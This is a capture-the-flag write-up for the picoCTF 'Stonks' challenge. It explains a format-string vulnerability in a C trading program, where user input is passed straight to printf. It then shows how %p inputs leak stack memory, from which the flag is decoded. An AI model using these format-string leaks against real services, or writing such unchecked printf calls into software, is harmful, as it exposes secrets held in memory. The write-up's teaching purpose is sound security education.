# Stonks
- Category : Binary Exploitation
- Points 20

### Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c) nc mercury.picoctf.net 59616

### Downloads
[enc](./enc)

### Hints

1. Okay, maybe I'd believe you if you find my API key.


## Overview

There is very little to go on here other than the hint that we need to find the API key. This will probably turn out to be the flag we need.

## Steps

1. First, let's grab the supplied file with wget

```
wget https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c
```


2. Opening *vuln.c* in a text editor shows that this is a C program - and is presumably behind the service running at *nc mercury.picoctf.net 59616*

3. Ok, let's see what the service is all about

```
nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
```

  Option 1 (buy some stonks) asks us to input an API token.
```
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
```

  It seems whatever we input, we get 'given' some *stonks*
```
What is your API token?
> sadfasd
Buying stonks with token: sadfasd
Portfolio as of Sat Dec 18 15:26:31 UTC 2021
3 shares of NZ
1273 shares of GJYT
Goodbye!
```
  And the service exists

  Option 2 (View my portfolio) simply tells us we have no stonks ... so it's not remembering us between visits
```
Portfolio as of Sat Dec 18 15:26:41 UTC 2021
You don't own any stonks!
Goodbye!
```


4. Going back to the editor; let's see where the API key is used

   The buy_stocks() method reads in the API from a server-side file and into the FLAG_BUFFER variable
   ```
   66: char api_buf[FLAG_BUFFER];
 	 67: FILE *f = fopen("api","r");

   72: fgets(api_buf, FLAG_BUFFER, f);
   ```

   However, it also asks the user for input (the API token) and then reflects it back to the user (line 93) without checks or filters applied ...
   ```
   90: printf("What is your API token?\n");
   91: scanf("%300s", user_buf);
   92: printf("Buying stonks with token:\n");
   93: printf(user_buf);
   ```

   this means that the program is vulnerable to a [format attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string)


5. So, let us read up a bit more on binary-exploitation (the category of this challenge). [OWASP](https://owasp.org/www-community/attacks/Format_string_attack) is a good place to start.

  The short version is that - because there is no checking in place, we are able to pass in a carefully constructed string that will cause the executing program to read data from it's execution stack rather than just the intended variable.

  In this case, if - when asked for our API token - we input
  ```
  What is your API token?
  %p%p
  ```
  The response will be a little strange
  ```
  What is your API token?
  %p%p                  
  Buying stonks with token:
  0x86634500x804b000
  ```
  These are values read from the stack.

  If we input a whole load of %p's, the response will - as it traces back through the stack - look like
  ```
  0x8b3b3b0 0x804b000 0x80489c3 0xf7effd80 0xffffffff 0x1 0x8b39160 0xf7f0d110 0xf7effdc7 (nil) 0x8b3a180 0x1 0x8b3b390 0x8b3b3b0 0x6f636970 0x7b465443 0x306c5f49 0x345f7435 0x6d5f6c6c 0x306d5f79
  ```


6. We know the stack contains our flag ... which should begin with "picoCTF"

   In hex, (again, using [RapidTables](https://www.rapidtables.com/convert/number/ascii-to-hex.html)) the string would be "70 69 63 6f 43 54 46"

   Scanning the values read from the stack, we can see that hex value (albeit reversed) in the 15th block returned.

   The reversal is because the system is using [little-endian](https://en.wikipedia.org/wiki/Endianness) based storage.


7. We don't, however, know the length of the flag string (as it varies between challenges).

   But we can use a bespoke [python script](./exploit.py) to figure it out for us - playing with the parameters until we can see the whole flag.

   And capture the whole challenge flag

   ```
   python3 exploit.py nc
   b'picoCTF{I_l05t_4ll_my_m0n3y_******}\x00\xf3\xff'
   ```


8. Cut and paste the displayed flag portion into the picoCTF window to gain the credit



### Side Notes

1. The challenge wasn't exactly quick, but the write-up took a whole heap longer than the challenge did!
